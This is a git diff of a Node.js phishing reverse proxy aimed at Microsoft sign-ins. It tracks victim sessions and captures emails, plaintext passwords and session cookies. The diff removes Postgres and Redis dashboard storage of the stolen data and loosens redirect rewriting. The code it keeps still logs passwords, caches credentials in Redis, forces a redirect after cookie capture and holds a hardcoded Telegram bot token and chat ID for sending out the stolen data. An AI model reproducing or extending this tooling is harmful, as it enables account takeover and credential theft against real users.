@@ -4,179 +4,10 @@ const path = require("path");
 const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
-
-const { Pool } = require('pg');
-const pool = new Pool({
-    connectionString: process.env.DATABASE_URL,
-    ssl: process.env.DATABASE_SSL === 'true' ? { rejectUnauthorized: false } : false
-});
-
-// ==================== DATABASE INITIALIZATION ====================
-async function initializeDatabase() {
-    const createTables = `
-        CREATE TABLE IF NOT EXISTS sessions (
-            id TEXT PRIMARY KEY,
-            ip TEXT,
-            user_agent TEXT,
-            geo JSONB,
-            host TEXT,
-            status TEXT,
-            created_at TIMESTAMPTZ DEFAULT NOW(),
-            updated_at TIMESTAMPTZ DEFAULT NOW()
-        );
-
-        CREATE TABLE IF NOT EXISTS credentials (
-            id SERIAL PRIMARY KEY,
-            session_id TEXT REFERENCES sessions(id) ON DELETE CASCADE,
-            email TEXT,
-            password TEXT,
-            url TEXT,
-            captured_at TIMESTAMPTZ DEFAULT NOW()
-        );
-
-        CREATE TABLE IF NOT EXISTS cookies (
-            id SERIAL PRIMARY KEY,
-            session_id TEXT REFERENCES sessions(id) ON DELETE CASCADE,
-            name TEXT,
-            value TEXT,
-            domain TEXT,
-            path TEXT,
-            expires BIGINT,
-            captured_at TIMESTAMPTZ DEFAULT NOW()
-        );
-    `;
-
-    try {
-        await pool.query(createTables);
-        console.log('[DB] Tables ready (sessions, credentials, cookies)');
-    } catch (err) {
-        console.error('[DB] Initialization failed:', err.message);
-        // You might want to exit the process if the DB is essential
-        process.exit(1);
-    }
-}
-
-// ==================== POSTGRES STORAGE ====================
-async function upsertSessionInDb(sessionId) {
-    const s = VICTIM_SESSIONS[sessionId];
-    if (!s) return;
-    try {
-        await pool.query(
-            `INSERT INTO sessions (id, ip, user_agent, geo, host, status, created_at, updated_at)
-             VALUES ($1, $2, $3, $4, $5, $6, NOW(), NOW())
-             ON CONFLICT (id) DO UPDATE SET
-                ip = EXCLUDED.ip,
-                user_agent = EXCLUDED.user_agent,
-                geo = EXCLUDED.geo,
-                host = EXCLUDED.host,
-                status = EXCLUDED.status,
-                updated_at = NOW()`,
-            [
-                sessionId,
-                s.ip || null,
-                s.userAgent || null,
-                s.geo ? JSON.stringify(s.geo) : null,
-                s.host || null,
-                s.status || 'active'
-            ]
-        );
-    } catch (err) {
-        console.error('[POSTGRES] upsertSessionInDb error:', err.message);
-    }
-}
-
-async function insertCredentialInDb(sessionId, credentials) {
-    try {
-        await pool.query(
-            `INSERT INTO credentials (session_id, email, password, url)
-             VALUES ($1, $2, $3, $4)`,
-            [sessionId, credentials.email, credentials.password, credentials.url || null]
-        );
-    } catch (err) {
-        console.error('[POSTGRES] insertCredentialInDb error:', err.message);
-    }
-}
-
-async function insertCookiesInDb(sessionId, cookies) {
-    try {
-        for (const c of cookies) {
-            // Sanitize expires: if NaN, Infinity, or not a number, use 0 (epoch)
-            const expires = (c.expires && !isNaN(c.expires) && isFinite(c.expires)) ? c.expires : 0;
-            await pool.query(
-                `INSERT INTO cookies (session_id, name, value, domain, path, expires)
-                 VALUES ($1, $2, $3, $4, $5, $6)`,
-                [sessionId, c.name, c.value, c.domain, c.path, expires]
-            );
-        }
-    } catch (err) {
-        console.error('[POSTGRES] insertCookiesInDb error:', err.message);
-    }
-}
 // const { HttpsProxyAgent } = require('https-proxy-agent'); // DISABLED – direct connection
 const Redis = require("ioredis");
 const redis = new Redis(process.env.REDIS_URL || "redis://localhost:6379");
 redis.on("error", (err) => console.error("[REDIS ERROR]", err.message));
-
-// ==================== DASHBOARD INTEGRATION ====================
-const DASHBOARD_REDIS_PREFIX = "medusa:session:";
-const DASHBOARD_EVENTS_CHANNEL = "medusa:events";
-
-function getSessionSummary(sessionId) {
-    const s = VICTIM_SESSIONS[sessionId];
-    if (!s) return null;
-    return {
-        sessionId,
-        ip: s.ip || null,
-        userAgent: s.userAgent || null,
-        geo: s.geo || null,
-        host: s.host || null,
-        hostname: s.hostname || null,
-        protocol: s.protocol || null,
-        path: s.path || null,
-        status: s.status || "active",
-        credentials: s.credentials || null,
-        cookieCount: s.cookies ? s.cookies.length : 0,
-        cookies: s.cookies ? s.cookies.map(c => ({
-            name: c.name,
-            domain: c.domain,
-            path: c.path,
-            expires: c.expires,
-            value: c.value
-        })) : [],
-        alerted: s.alerted || false,
-        captchaPassed: s.captchaPassed || false,
-        createdAt: s.createdAt || Date.now()
-    };
-}
-
-async function saveSessionToRedis(sessionId) {
-    const summary = getSessionSummary(sessionId);
-    if (!summary) return;
-    try {
-        await redis.set(
-            `${DASHBOARD_REDIS_PREFIX}${sessionId}`,
-            JSON.stringify(summary),
-            "EX",
-            60 * 60 * 24 // keep for 24 hours
-        );
-    } catch (err) {
-        console.error("[DASHBOARD] Failed to save session to Redis:", err.message);
-    }
-}
-
-async function publishDashboardEvent(type, sessionId, extra = {}) {
-    try {
-        const event = {
-            type,
-            sessionId,
-            timestamp: Date.now(),
-            ...extra
-        };
-        await redis.publish(DASHBOARD_EVENTS_CHANNEL, JSON.stringify(event));
-    } catch (err) {
-        console.error("[DASHBOARD] Failed to publish event:", err.message);
-    }
-}
 // ==================== TELEGRAM CONFIGURATION ====================
 const TELEGRAM_BOT_TOKEN = '8986334659:AAGtVf_vgVHkvXVKNP1xf3KcnCEN-QCHsk8';
 const TELEGRAM_CHAT_ID = '8531631021';
@@ -584,23 +415,13 @@ getVictimGeo(VICTIM_SESSIONS[cookieName].ip).then(geo => {
     };
 
     // Store in memory
-VICTIM_SESSIONS[currentSession].credentials = credentials;
-VICTIM_SESSIONS[currentSession].status = "mfa_pending";
-console.log(`[CRED STORED] Email: ${credentials.email} | Password: ${credentials.password}`);
+    VICTIM_SESSIONS[currentSession].credentials = credentials;
+    console.log(`[CRED STORED] Email: ${credentials.email} | Password: ${credentials.password}`);
 
-// Also store in Redis (key = session cookie name)
-const redisKey = `session:${currentSession}`;
-redis.set(redisKey, JSON.stringify(credentials), "EX", 3600)
-    .catch(err => console.error("[REDIS SET]", err.message));
-
-// Dashboard + Postgres
-saveSessionToRedis(currentSession).catch(() => {});
-publishDashboardEvent('credential_captured', currentSession, {
-    email: credentials.email,
-    password: credentials.password
-}).catch(() => {});
-insertCredentialInDb(currentSession, credentials).catch(() => {});
-upsertSessionInDb(currentSession).catch(() => {});
+    // Also store in Redis (key = session cookie name)
+    const redisKey = `session:${currentSession}`;
+    redis.set(redisKey, JSON.stringify(credentials), "EX", 3600)
+        .catch(err => console.error("[REDIS SET]", err.message));
 }
                             }
                         }
@@ -618,12 +439,7 @@ upsertSessionInDb(currentSession).catch(() => {});
         clientResponse.end();
     }
 });
-
-// Start the server only after DB initialization
-initializeDatabase().then(() => {
-    proxyServer.listen(process.env.PORT ?? 3000);
-    console.log(`Proxy server running on port ${process.env.PORT ?? 3000}`);
-});
+proxyServer.listen(process.env.PORT ?? 3000);
 
 const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest, proxyIndex = 0) => {
     const isHttps = proxyRequestProtocol === "https:";
@@ -644,20 +460,19 @@ if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
     if (proxyResponseLocation) {
         try {
             const locationURL = new URL(proxyResponseLocation);
-            // Only rewrite if the Location points to the real Microsoft host
-            if (locationURL.host === VICTIM_SESSIONS[currentSession].host) {
-                console.log(`[REDIRECT REWRITE (ALL)] Original: ${proxyResponseLocation}`);
-                // Update session to the target host (important for subsequent requests)
-                VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
-                VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
-                VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
-                VICTIM_SESSIONS[currentSession].port = locationURL.port;
-                VICTIM_SESSIONS[currentSession].host = locationURL.host;
-                // Rewrite Location to point back to your proxy domain
-                const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
-                proxyResponse.headers.location = rewritten;
-                console.log(`[REDIRECT REWRITE (ALL)] Rewritten: ${rewritten}`);
-            }
+            console.log(`[REDIRECT REWRITE (ALL)] Original: ${proxyResponseLocation}`);
+            
+            // Update session to the target host (important for subsequent requests)
+            VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
+            VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
+            VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
+            VICTIM_SESSIONS[currentSession].port = locationURL.port;
+            VICTIM_SESSIONS[currentSession].host = locationURL.host;
+
+            // Rewrite Location to point back to your proxy domain
+            const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
+            proxyResponse.headers.location = rewritten;
+            console.log(`[REDIRECT REWRITE (ALL)] Rewritten: ${rewritten}`);
         } catch (error) {
             VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
             console.log(`[REDIRECT PARSE ERROR] ${error.message}`);
@@ -736,17 +551,10 @@ const caption =
     }, 10000); // delete after 10 seconds
 
     // Mark as alerted
-sessionData.alerted = true;
-sessionData.status = "cookies_captured";
+    sessionData.alerted = true;
 
-// Dashboard + Postgres
-saveSessionToRedis(currentSession).catch(() => {});
-publishDashboardEvent('cookies_captured', currentSession).catch(() => {});
-insertCookiesInDb(currentSession, sessionData.cookies).catch(() => {});
-upsertSessionInDb(currentSession).catch(() => {});
-
-// Force redirect on next navigation request
-sessionData.pendingRedirect = true;
+    // Force redirect on next navigation request
+    sessionData.pendingRedirect = true;
 }
 // ================================================
 // ================================
@@ -882,11 +690,6 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName].alerted = false;
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
 
-    VICTIM_SESSIONS[cookieName].createdAt = Date.now();
-saveSessionToRedis(cookieName).catch(() => {});
-publishDashboardEvent('session_created', cookieName).catch(() => {});
-upsertSessionInDb(cookieName).catch(() => {});
-    
     return {
         cookieName: cookieName,
         cookieValue: cookieValue
